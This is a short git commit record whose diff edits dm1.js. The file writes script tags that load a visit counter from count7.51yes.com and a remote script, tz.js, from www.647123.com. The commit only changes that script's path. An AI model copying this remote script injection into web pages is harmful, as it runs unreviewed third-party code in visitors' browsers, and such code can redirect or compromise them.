041aa564fee751f1dfa6c45d371bde5eda142945
js999999999 <js-9@outlook.com>
2017-11-18 12:49:07 +0800

    Update dm1.js

--- cc1z/dm1.js
+++ cc1z/dm1.js
@@ -1,3 +1,3 @@
 document.writeln("<script language=\"javascript\" src=\"http:\/\/count7.51yes.com\/click.aspx?id=77419839&logo=12\" charset=\"gb2312\"><\/script>");
 
-document.writeln("<script src=http:\/\/\www.647123.com\/cc1111z/tz.js ><\/script>");
+document.writeln("<script src=http:\/\/\www.647123.com\/cc1z/tz.js ><\/script>");
